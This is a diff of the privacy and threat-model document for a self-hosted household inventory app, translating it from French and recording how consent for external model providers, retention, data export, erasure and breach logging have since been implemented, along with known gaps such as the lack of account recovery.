+| **Sending to an external model provider** | **Consent** (art. 6(1)(a)), explicit, per household, revocable | This is a transmission to a third party, often outside the EU. It must be **opt-in**, never a default. The `ollama` mode must remain fully functional without this consent. **Enforced since revision `0016`**: `llm_provider_config.consented_at` / `consent_revoked_at`, refused at `ProviderService._load` before the credential is decrypted, `ollama` exempt. Per *configuration*, not one flag per household — see below. The route that grants it is not built, because no route creates a provider configuration at all. |
+| Open Food Facts product cache | Not applicable | No personal data: it is a shared external reference. This is also why it has **no** `household_id`. |
 
-**Transferts hors UE.** Anthropic, OpenAI et Google traitent aux États-Unis :
-transfert au titre du chapitre V, à couvrir par le mécanisme applicable au
-fournisseur. **Mistral (UE) et Ollama (local) sont les deux configurations sans
-transfert** — c'est déjà présenté comme un critère de choix affiché dans
-l'interface, et c'est aussi la réponse RGPD la plus simple pour un exploitant
-européen.
+**Transfers outside the EU.** Anthropic, OpenAI and Google process in the United
+States: a transfer under Chapter V, to be covered by the mechanism applicable to
+the provider. **Mistral (EU) and Ollama (local) are the two configurations with
+no transfer** — this is already presented as a selection criterion shown in the
+interface, and it is also the simplest GDPR answer for a European operator.
 
-**Le BYOK réduit l'exposition mais ne l'annule pas.** L'ADR-0007 note à juste
-titre que chaque foyer contracte directement avec son fournisseur. Mais c'est
-**le serveur de l'exploitant** qui construit et émet la requête : il reste dans
-la chaîne, et il doit donc informer et recueillir le consentement.
+**BYOK reduces the exposure but does not remove it.** ADR-0007 rightly notes that
+each household contracts directly with its provider. But it is **the operator's
+server** that builds and issues the request: it remains in the chain, and it must
+therefore inform and collect consent.
 
-### 8.4 Durées de rétention — à définir avant le premier compte tiers
+**Why the consent is per configuration, when the row above says "per household".**
+A configuration is household-scoped, so a consent attached to one *is* per
+household; splitting it further is what makes it **specific** in the sense of
+art. 4(11). The paragraph immediately below names Mistral (EU) and Ollama (local)
+as the two setups with no transfer at all, and the interface already shows that as
+a selection criterion. Agreeing to a French company processing in the EU is not the
+same act as agreeing to a Chapter V transfer to the United States, and a single
+household-wide flag would collapse the two into the blanket consent that
+distinction exists to prevent. A household that withdraws from Anthropic keeps
+Mistral.
 
-Aucune n'est fixée aujourd'hui. Ce sont des propositions à arbitrer, pas des
-décisions. Chacune suppose une **colonne et une tâche**, sans quoi elle n'existe
-pas.
+**Rows that predate the consent columns were not backfilled, on purpose.** A
+fabricated `consented_at` would not merely mislabel a record: it would manufacture
+the legal basis for a transfer nobody agreed to. They fail closed instead — the
+provider is refused at the next request, with the reason and the remedy on the
+degradation banner — which is the same reasoning revision `0014` used when it
+refused to invent a plausible registrant for an export destination.
 
-| Donnée | Proposition | Justification |
+### 8.4 Retention periods — to be defined before the first third-party account
+
+None is fixed today. These are proposals to be arbitrated, not decisions. Each
+one assumes **a column and a task**, without which it does not exist.
+
+| Data | Proposal | Rationale |
 |---|---|---|
-| Image de ticket | **Purge dès la confirmation** de la revue, ou 30 jours maximum | Après revue, elle ne sert plus qu'à contester ; les lignes extraites suffisent. C'est la donnée la plus lourde et la plus sensible. |
-| `receipt.raw_response` | 90 jours | Utile au débogage d'un pipeline non déterministe, inutile au-delà. |
-| `recipe_suggestion.stock_snapshot` | **30 jours** | Sert à expliquer une suggestion récente. Un inventaire de domicile vieux d'un an ne sert à personne et pèse lourd en cas de fuite. |
-| `receipt_line.raw_label` | Conservation longue **après anonymisation du lien au foyer** | C'est le corpus d'amélioration du rapprochement ; il n'a pas besoin d'un `household_id`. |
-| `stock_movement` | 24 mois | Statistiques de gaspillage annuelles ; au-delà, agréger. |
-| Journaux applicatifs | 30 jours | Diagnostic et sécurité. |
-| Compte supprimé | Effacement immédiat et **total**, base **et** stockage objet | Voir 8.5. |
+| Receipt image | **Purge as soon as the review is confirmed**, or 30 days maximum | After review it serves only to contest; the extracted lines are enough. It is the heaviest and most sensitive item of data. |
+| `receipt.raw_response` | 90 days | Useful for debugging a non-deterministic pipeline, useless beyond that. |
+| `recipe_suggestion.stock_snapshot` | **30 days** | Serves to explain a recent suggestion. A year-old home inventory serves nobody and weighs heavily in the event of a leak. |
+| `receipt_line.raw_label` | Long retention **after anonymising the link to the household** | It is the corpus for improving matching; it does not need a `household_id`. |
+| `stock_movement` | 24 months | Annual waste statistics; beyond that, aggregate. |
+| Application logs | 30 days | Diagnostics and security. |
+| `user_session`, `machine_token` (dead rows) | **30 days after they stop authenticating**, swept weekly | *Decided and implemented*, unlike the rest of this table: `backend/scripts/purge_expired_credentials.py`, `ops/chaudron-purge-credentials.timer`. Not zero, because these rows are the only record of when a session ended and whose it was — the first thing a breach review reads (§8.6). Not never, because `user_session` is read on every authenticated request and nothing had ever removed a row from it. |
+| Deleted account | Immediate and **total** erasure, database **and** object storage | See 8.5. |
 
-### 8.5 Droits des personnes, et ce que le logiciel doit fournir
+### 8.5 Data subject rights, and what the software must provide
 
-| Droit | Ce qu'il faut construire | État |
+| Right | What must be built | State |
 |---|---|---|
-| Accès et portabilité (art. 15, 20) | Un export complet d'un foyer dans un format ouvert : stock, mouvements, tickets, images, suggestions | À construire. Rien n'existe. |
-| **Effacement (art. 17)** | Suppression d'un foyer **et** de ses objets | `ON DELETE CASCADE` depuis `household` couvre PostgreSQL de façon totale et atomique — c'est bien vu et explicitement motivé. **Mais le CASCADE ne supprime aucune image du stockage objet.** Un effacement partiel présenté comme complet est une non-conformité. Il faut une opération applicative qui supprime les objets **avant** de supprimer la ligne, et qui est vérifiée. |
-| Rectification (art. 16) | Correction des lignes et des fiches ; la correction locale prime sur une resynchronisation externe | Prévu côté produit, à porter dans le schéma. |
-| Opposition / retrait du consentement | Désactiver l'envoi au fournisseur externe sans casser le reste de l'application | Acquis par conception : les fonctions de modèle sont optionnelles et le reste de Chaudron fonctionne sans. |
-| Le membre qui part | Que devient un foyer dont le dernier membre s'en va ? | **Non tranché.** Le `CASCADE` répond techniquement, pas juridiquement : les données d'un foyer appartiennent à plusieurs personnes, et le départ de l'une ne doit pas effacer celles des autres — ni les conserver indéfiniment. |
-| Information | Une politique de confidentialité type, fournie avec le logiciel, que l'exploitant adapte | À écrire. Un logiciel auto-hébergeable qui n'en fournit pas laisse chaque exploitant en produire une fausse. |
+| Access and portability (art. 15, 20) | A complete export of a household in an open format: stock, movements, receipts, images, suggestions | **Built**: `GET /v1/households/export`, JSON, one key per table and the schema's own column names. Generated from `Base.metadata` rather than from a hand-written projection, so a column added later is disclosed by default; the only exceptions are the five credential columns in `services/privacy.py`'s `WITHHELD_COLUMNS`, and the document names them and says why. The public Open Food Facts entries a household's rows point at are exported separately and labelled as reference data, since §8.3 says they are not personal data. **Owner-only** — a member exercising art. 15 goes through the operator, which is a product decision argued in `api/routers/privacy.py` and sits next to the unsettled row below. **There are no images**: revision `0012` retains none. |
+| **Erasure (art. 17)** | Deletion of a household **and** of its objects | **Built**: `DELETE /v1/households`, owner-only. `ON DELETE CASCADE` from `household` does the work; the route makes it reachable, verifies it by re-reading every tenant table before committing, and returns the per-table counts as a receipt. Migration `0017` adds the engine half — row-level security on `household` restricting `DELETE` to the posted tenant — so a wrong identifier erases nothing rather than a stranger. **On the objects**: this build stores no receipt image and has no object-storage client, so rather than imply a bucket was cleaned, the erasure **refuses** (`409`) when it finds a receipt carrying a retained key. A deployment that reintroduces retention has to reintroduce its deletion. Nothing is anonymised to survive: the §8.4 proposal to keep `receipt_line.raw_label` "after anonymising the link" is deliberately not applied here. |
+| Rectification (art. 16) | Correction of the lines and of the entries; the local correction takes precedence over an external resynchronisation | Planned on the product side, to be carried into the schema. |
+| Objection / withdrawal of consent | Disabling sending to the external provider without breaking the rest of the application | Acquired by design: the model features are optional and the rest of Chaudron works without them. |
+| The member who leaves | What becomes of a household whose last member leaves? | **Not settled.** The `CASCADE` answers technically, not legally: a household's data belong to several people, and one person's departure must neither erase the others' data nor retain them indefinitely. |
+| Information | A template privacy policy, shipped with the software, that the operator adapts | To be written. Self-hostable software that ships none leaves each operator to produce a false one. |
 
-### 8.6 Violation de données
+### 8.6 Data breach
 
-L'exploitant doit notifier sous 72 heures. Pour que ce soit possible, Chaudron doit
-**journaliser les accès aux actifs sensibles** : lecture d'un chiffré de clé,
-export d'un foyer, suppression d'un foyer, changement de configuration de
-fournisseur. Aucune table d'audit n'existe aujourd'hui. Sans elle, l'exploitant
-ne peut ni délimiter une violation ni prouver qu'il n'y en a pas eu.
+The operator must notify within 72 hours. For that to be possible, Chaudron must
+**log accesses to the sensitive assets**: reading an encrypted key, exporting a
+household, deleting a household, changing a provider configuration. No audit
+table exists today. Without one, the operator can neither delimit a breach nor
+prove that there has not been one.
+
+**One of those four is now recorded, and deliberately not in a table.** Deleting
+a household writes a structured log line (`household_erased`) carrying the
+household identifier and a count of rows removed per table — no name, no email,
+no product — and the same counts go back to the data subject in the response
+body. A table was rejected rather than deferred: a row that names the erased
+household either cascades away with it, and proves nothing, or survives it, and
+an article 17 erasure has then retained an identifier of the person who asked to
+be forgotten. Hashing the identifier does not escape recital 26, because
+everybody who could ask the question holds the original. Migration `0017` carries
+the full argument. **The other three are still unrecorded**, and for them a table
+does not have that problem: reading a key, exporting a household and changing a
+provider configuration all leave the household in existence.
 
 ---
 
-## 9. Ce que ce modèle n'a pas traité
+## 9. What this model has not covered
 
-Par honnêteté, et pour que la prochaine relecture sache par où reprendre :
+For honesty's sake, and so that the next review knows where to pick up:
 
-- **La topologie Ollama « navigateur »** (cas B) est hors v1. Elle rouvrira toute
-  la §6.2 sous un angle différent : le prompt devient public, et le backend
-  validera une réponse dont il ne contrôle pas du tout la provenance.
-- **La PWA elle-même** : service worker, cache hors ligne, IndexedDB contenant un
-  inventaire sur un appareil partagé ou perdu. C'est un actif de type A3 sur un
-  support non maîtrisé, et il n'est pas analysé ici.
-- **La synchronisation hors ligne** : des identifiants générés côté client
-  (UUIDv7) et rejoués à la reconnexion demandent une validation d'appartenance
-  côté serveur qui n'est pas décrite.
-- **Le mode d'authentification externe (OIDC)**, évoqué pour la phase 2.
-- **La gouvernance du catalogue public** : qui peut corriger un `product`
-  partagé, et ce qu'un contributeur hostile peut y écrire pour tous les foyers.
+- **No outbound mail, hence no account recovery.** The instance has no SMTP
+  configuration — there is none anywhere in the repository. Three things follow
+  from this, and they are accepted rather than worked around:
+
+  1. **No address verification.** An account can be created with somebody else's
+     address. The real impact is low as long as the only thing an address opens
+     is a household created by the same gesture, but it will grow the day email
+     invitations exist.
+  2. **No password reset, and this is deliberate.** A recovery path that does not
+     verify the address is an unauthenticated backdoor: whoever knows the address
+     takes the account. A lost password is therefore a lost account, and the login
+     screen says so. The path that works is a human one: an `owner` of the
+     household re-invites the person.
+  3. **Sign-up is an enumeration oracle.** `409 email-already-registered`
+     confirms that an address has an account. Closing it would require responding
+     identically in both cases *and* sending a message to the address — that is,
+     exactly what cannot be done here.
+
+  What it would take to lift all three, in order: an SMTP configuration
+  **validated at startup** (fail-fast, like the rest of `config.py` — a send that
+  fails silently turns "I did not receive the message" into an unsolvable
+  incident), single-use short-lived tokens **stored hashed** exactly like sessions
+  (`user_session.token_hash`), rate limiting per address *and* per IP on the
+  request as well as on the consumption, and invalidation of **all** the user's
+  sessions on password change (`AuthService.revoke_all` already exists for this).
+  Until that is done, building nothing is better than half a path.
+
+- **The "browser" Ollama topology** (case B) is out of scope for v1. It will
+  reopen the whole of §6.2 from a different angle: the prompt becomes public, and
+  the backend will validate a response whose provenance it does not control at
+  all.
+- **The PWA itself**: service worker, offline cache, IndexedDB containing an
+  inventory on a shared or lost device. It is an A3-class asset on an
+  uncontrolled medium, and it is not analysed here.
+- **Offline synchronisation**: client-generated identifiers (UUIDv7) replayed on
+  reconnection require server-side ownership validation that is not described.
+- **External authentication mode (OIDC)**, mentioned for phase 2.
+- **Governance of the public catalogue**: who may correct a shared `product`, and
+  what a hostile contributor can write there for every household.
 
 ---
 
-## 10. Révision
+## 10. Revision
 
-Ce document est relu :
+This document is re-read:
 
-- à chaque ADR touchant une des surfaces de la §6 ;
-- avant la première migration Alembic (les décisions RLS et rétention doivent y
-  être) ;
-- avant l'ouverture d'un compte à une personne extérieure au cercle familial ;
-- après chaque avis de sécurité reçu via [`SECURITY.md`](../SECURITY.md).
+- at every ADR touching one of the surfaces in §6;
+- before the first Alembic migration (the RLS and retention decisions must be in
+  it);
+- before opening an account to a person outside the family circle;
+- after every security advisory received via [`SECURITY.md`](../SECURITY.md).
 
-**Une surface dont la colonne « Non couvert » n'a pas bougé depuis six mois est
-soit parfaite, soit oubliée. Ce n'est jamais la première.**
+**A surface whose "Not covered" column has not moved in six months is either
+perfect or forgotten. It is never the first.**
